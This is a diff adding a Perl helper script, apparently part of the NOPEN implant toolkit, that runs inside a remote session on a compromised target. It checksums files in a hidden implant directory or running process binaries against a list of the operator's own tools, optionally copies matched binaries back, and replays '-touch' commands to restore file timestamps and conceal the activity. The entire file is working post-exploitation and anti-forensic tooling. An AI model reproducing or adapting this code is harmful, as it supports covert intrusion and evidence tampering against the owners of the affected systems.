@@ -1,0 +1,379 @@
+#!/usr/bin/env perl
+##
+$VER="1.0.0.11";
+$| = 1 ;
+
+my (%checksums,$target_bin,$message,$messagebuiltin,
+   ) = ();
+my $getfile = 0;
+
+
+myinit() ;
+
+# We return our results via this global:
+newhostvar("host_toolcheckresults","");
+
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$targetwdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+  =  parsestatus();
+
+my ($dodir,$thisbin,$touchoutput,$nothing,@touchoutput,$lsoutput,$nopenlines,
+    @lsoutput,$onemore,$lsrecurse) = ();
+my $tmptail = "$optmp/tail.toolcheck.$nopen_mypid";
+
+$target_bin = "$host_hiddendir/*"
+  unless ($target_bin or
+	  @dopaths or
+	  @dopids);
+unless ($target_bin or
+	@dopaths or
+	@dopids) {
+  $target_bin = "$targetcwd/*";
+  offerabort("You have not chosen any path or remote name, nor is there any\n".
+	     "directory to default to. If you continue, you will default to\n".
+	     "examining all of $target_bin.");
+}
+
+my $sumssofar = 0;
+
+foreach $thisbin ($target_bin,@dopaths,@dopids) {
+  # TODO: Add stuff for when this is a PID
+  my (@thistouchoutput,@thislsoutput,$onproc) = ();
+  next unless $thisbin;
+  if ($thisbin =~ /^\d+$/) {
+    $onproc++;
+    if ($linuxtarget) {
+      $thisbin = "/proc/$thisbin/exe";
+    } elsif ($solaristarget) {
+      $thisbin = "/proc/$thisbin/object/a.out";
+    } else {
+      mydie("Cannot proceed with PID $thisbin on $nopen_server_os");
+    }
+  }
+  my $dobin = $thisbin;
+  if ($dobin =~ m,^\s*/,) {
+    $dodir = dirname($dobin);
+    $dobin = "/".basename($dobin);
+  } else {
+    $dodir = defined $sourcedir ? $sourcedir : "$host_hiddendir/er*";
+    $dobin = defined $target_bin ? "/$target_bin" : "/*";
+  }
+
+  # Get the -ls line for the TOOL binary on target.
+  ($touchoutput,$nothing,$lsoutput,$nopenlines,$onemore) = ();
+  $lsrecurse = $recursedir ? "R" : "";
+  while (!$lsoutput) {
+    ($touchoutput,$nothing,@thistouchoutput) = doit("-ls -n$lsrecurse $dodir$dobin")
+      unless (isbeneathhidden($dodir));
+dbg("isbeneathhidden($dodir) is true")
+  if isbeneathhidden($dodir);
+dbg("isbeneathhidden($dodir) is false")
+  unless isbeneathhidden($dodir);
+    dbg("
+
+
+in autotoolcheck0, got touchoutput=$touchoutput=(@thistouchoutput)
+
+
+");
+    push(@touchoutput,@thistouchoutput);
+    ($lsoutput,$nopenlines,@thislsoutput) = doit("-ls$recursedir $dodir$dobin");
+    dbg("
+
+
+in autotoolcheck1, got lsoutput=$lsoutput=(@thislsoutput)
+
+
+");
+    # We fix @thislsoutput to be 
+    if ($onproc) {
+      my @new = ();
+      foreach (@thislsoutput) {
+	dbg("ls was: $_");
+	s,$thisbin.*,$thisbin,g;
+	# Fudge this entry to a non-zero byte file instead of a link
+	s/^l/-/g;
+	s/  0/111/g;
+	push(@new,$_);
+	dbg("ls NOW: $_");
+      }
+      @thislsoutput = @new;
+    }
+
+    # @lsoutput is processed next
+    push(@lsoutput,@thislsoutput)
+      if (@thislsoutput);
+    dbg("
+
+
+in autotoolcheck, got line =$lsoutput=(@thislsoutput)
+
+
+touchoutput=$touchoutput=(@thistouchoutput)
+
+
+");
+    if (!$lsoutput) {
+      if ($onemore) {
+	# Been here, done that, get out of loop
+	myalert("No such file or directory at $dodir$dobin");
+	last;
+      }
+      if ($dodir eq "$host_hiddendir/er*") {
+	$dodir = $host_hiddendir;
+	$onemore = "\n(Trying $dodir instead)";
+      }
+      myalert("No such file or directory at $dodir$dobin$onemore");
+      last unless $onemore;
+    }
+  }
+}
+
+dbg("GOT OUTPUT=(
+".join("\n",@lsoutput)."
+)");
+
+
+goto RETURN1 unless @lsoutput;
+
+my @toollisting = ();
+
+foreach my $line (@lsoutput) {
+  my ($toolsize,$month,$toolpath) = $line =~ m,^-.*\s+(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).*\d{4}\s+(/.*)$, ;
+  next unless ($toolsize and $toolpath);
+  $toolpath2 = $toolpath;
+  $toolpath2 =~ s,(\s),\\\1,g;
+dbg("
+
+Got toolpath=$toolpath=
+
+
+");
+  # We skip these, they are SBZ or STOIC state files
+  next if ($toolpath =~ m,0x([0-9a-f]){8}_0x([0-9a-f]){8}_0x([0-9a-f]){8}_0x([0-9a-f]){8}$, or
+	   $toolpath =~ m,\.[0-9a-f]{16}/[0-9a-f]{32}$, );
+  #    dbg("in autotoolcheck, got target size =$toolsize= and path =$toolpath=");
+  # Now get the checksum for each path.
+
+  # Line count prior to -sha1sum line
+  $cmdoutlinecount = int(`wc -l $cmdoutfile`);
+
+  # First, we try -sha1sum to see if positive match tehre
+  unlink($tmptail);
+dbg("
+
+Still Got toolpath=$toolpath=
+
+
+");
+  $sumssofar++;
+  ($sumout,$nopenlines,@sumout) = doit("-sha1sum $toolpath2");
+  # We reassign $sumout, ignoring target line looking for positive hit only
+  ($sumout)  = $sumout[$#sumout];
+
+  if ($sumout =~ m,\+\s+([a-f0-9]{40})\s+(.*\d\d\d\d)\s+(.+),i) {
+    ($nopencksum,$builddate,$toolname) = ($1,$2,$3);
+    if ($toolname =~ m,(\S+)\s+\[(.*\]),) {
+      $toolname = "\[from $2$1";
+    }
+    $messagebuiltin .= 
+      sprintf("%-32s at $toolpath\n",$toolname);
+    push(@toollisting,$line);
+    # Retrieve the binary, if asked, now that it's known good.
+    doit("-get -q $toolpath") if $getfile;
+    next;
+  }
+  # If -sha1sum has no positive match, we try $sumbin;
+  next if $notargetsumbin;
+  $sumbin = whichbin("cksum");
+  $sumbin = whichbin("sum") unless $sumbin;
+  $notargetsumbin++ unless $sumbin;
+  next unless $sumbin;
+  $sumssofar++;
+  ($sumout,$nopenlines,@sumout) = doit("$sumbin \"$toolpath\"");
+  my ($toolsum) = $sumout =~ /^(\d+)\s*\d+\s*\S+.*$/;
+  unless ($toolsum) {
+    mywarn("SOMTHING ODD: $sumbin $toolpath did not produce valid $sumbin output");
+    next;
+  }
+  dbg("in autotoolcheck, got TARGET $sumbin checksum =$toolsum= for path =$toolpath= size=$toolsize=");
+
+  # The %checksums hash is keyed to the file checksum (for the correct binary we are running).
+  # It is a space deliminted STRING of NAMEVER,,,SIZE values.
+  # (Since sums ought to be unique, should be just one such per string.)
+  my ($validsize,$toolname) = ();
+  foreach my $cksum (keys %checksums) {
+    # Almost certainly, just one $namesize in $cksum, as sums should not overlap.
+    foreach my $namesize (split(/\s+/,$checksums{$cksum})) {
+      ($toolname,$validsize) = $namesize =~ /(.*),,,(.*)/;
+      #dbg("NOT GETTING PAST:
+      #	next unless (\$toolname=$toolname and \$validsize=$validsize)
+
+      #") unless ($toolname and $validsize);
+      next unless ($toolname and $validsize);
+      #dbg("NOT GETTING PAST:
+      #	next unless (
+      #\$toolsize=$toolsize= == \$validsize=$validsize= and 
+      #\$toolsum=$toolsum == \$cksum=$cksum
+
+      #") unless ($toolsize == $validsize and
+      #	   $toolsum == $cksum
+      #	  );
+      unless ($toolsize == $validsize and
+	      $toolsum == $cksum
+	     ) {
+	#	  dbg("NO ER MATCH for $toolname");
+	next;
+      }
+      dbg("in autotoolcheck, found ER MATCH:
+
+\$toolname=$toolname=
+\$toolsize=$toolsize= == \$validsize=$validsize= and 
+\$toolsum=$toolsum == \$cksum=$cksum
+
+");
+      # We found it!
+#      $message .= "\n\n" if $message;
+      $message .= 
+	sprintf("%-32s at $toolpath\n",$toolname);
+      push(@toollisting,$line);
+
+      # Retrieve the binary, if asked, now that it's known good.
+      doit("-get -q $toolpath") if $getfile;
+    }
+  }
+}
+dbg("sumssofar=$sumssofar=");
+if ($sumssofar) {
+  my @new = ();
+  @touchoutput = grep /-touch /,@touchoutput;
+  @touchoutput = grep ! m,\.\.*$, , @touchoutput;
+#  foreach (@touchoutput) {
+#    next unless /-touch /;
+#    next if m,\.\.*$, ;
+#    s/ /\\ /g;
+#    push(@new,$_);
+#  }
+#  @touchoutput = grep /-touch /,@touchoutput;
+#  @touchoutput = grep ! m,\.\.*$, , @touchoutput;
+  doit(sort by_path_depth @touchoutput);
+}
+
+$message  = "\n${COLOR_FAILURE}\nVia $sumbin, found:\n${COLOR_NORMAL}\n".$message if $message;
+$message .= "\n${COLOR_FAILURE}\nVia NOPEN -sha1sum, found:\n${COLOR_NORMAL}\n".$messagebuiltin
+  if $messagebuiltin;
+if ($message) {
+  my $toollog = "";# Eventually have this log to UsedTools
+  $message = "\n${COLOR_FAILURE}\nTOOLS matching checksums found on target:\n${COLOR_NORMAL}\n".
+  join("\n",@toollisting).
+  "\n\n".
+  $message."\n\n";
+#  "Logged in $toollog.";
+  
+} else {
+  $message = "$COLOR_FAILURE No tools found$COLOR_NORMAL";
+}
+progprint("\n\n$message");
+# End with true value as we may someday require this script elsewhere.
+RETURN1:
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  # $calleddirect is set if 
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+#    progprint("$prog called -gs toolcheck @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs toolcheck" ;
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	    "(I.e., noclient calls $prog, not you.)\n".
+	    "$vertext") unless $nopen_rhostname;
+  }
+  clearallopts();
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"-gs toolcheck\" or
+\"=toolcheck\" is used.
+
+";
+  $gsusagetext="Usage: -gs toolcheck [options] [PATHs] [PIDs]
+
+$prog uses a checksum to positively identify our tools
+on target. If NOPEN's builtin -sha1sum finds a match, that is used.
+If not, the unix command cksum is used, and if that is not on target,
+sum is used (with -s option if on Linux).
+
+If a match is found it prints the release name and target path of each
+target binary that matches.
+
+The list of checksums is in $opetc/cksums (for NOPEN -sha1sums) and
+in $opup/tools.sums.txt (for cksum and sum). This list must be
+updated from time to time. It contains sums for tools like ENEMYRUN,
+NOPEN, SIFT, CURSE\* parsers, etc.
+
+OPTIONS
+
+ -d dir     Full path to directory on target to examine
+            (default is STOIC hidden directory plus the glob 'er*')
+ -R         Examine the directory recursively (forces -f to be \"\")
+ -f file   binary to be examined (default is 'nscd')
+            To examine all files there, use -f \\\\*
+ -P PID
+ -g         Retrieve the binary from target after examining checksum
+
+NOTE: If -d is NOT used and -f is a full path to a file, the directory
+      in -f is used as -d, overriding the default for -d.
+
+";
+  mydie("bad option(s)") if (! Getopts( "d:f:ghvR" ) ) ;
+  $sourcedir = $opt_d ;
+  $recursedir = "";
+  $recursedir = " -R" if $opt_R;
+  $getfile = $opt_g ;
+  @dopids = uniqify_array(grep /^\d+$/,@ARGV);
+  @dopaths = uniqify_array(grep m,^/.+$,,@ARGV);
+  mydie("Cannot use PIDs as targets unless on Linux or Solaris")
+    if (@dopids and !($solaristarget or $linuxtarget));
+
+  $target_bin = $opt_f if ($opt_f);
+  $target_bin = "" if ($recursedir);
+  usage() if ($opt_h or $opt_v) ;
+
+  # Confirm our local files are as expected, populate
+  # %strifesize and %strifefile
+  my $toolsumsfile = "$opup/tools.sums.txt";
+  unless (open(CKSUMS,$toolsumsfile)) {
+    mydie("Cannot open(CKSUMS,$toolsumsfile): $!");
+  }
+  while (<CKSUMS>) {
+    # The hash is keyed to the file size; the first entry is the
+    # checksum and the second entry is the release name of the binary.
+    next if (/\s*\#/ or /^\s*$/);
+    my ($name,$validsize,$cksum,$sum,$solarissum) = /^\s*(\S+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/;
+    next unless ($sum and $cksum and $validsize and $name);
+    # We populate %checksums with both linux sums and solaris (sum -s on linux) sums
+    $checksums{$sum} .= "$name,,,$validsize ";
+    $checksums{$solarissum} .= "$name,,,$validsize ";
+    $checksums{$cksum} .= "$name,,,$validsize ";
+  }
+  close(CKSUMS);
+  $socket = pilotstart(quiet) unless $socket;
+  # $sumbin is set with first call to whichbin(), which if -sha1sum
+  # works will never get called
+  $sumbin = "";
+  $notargetsumbin = 0;
+} #myinit
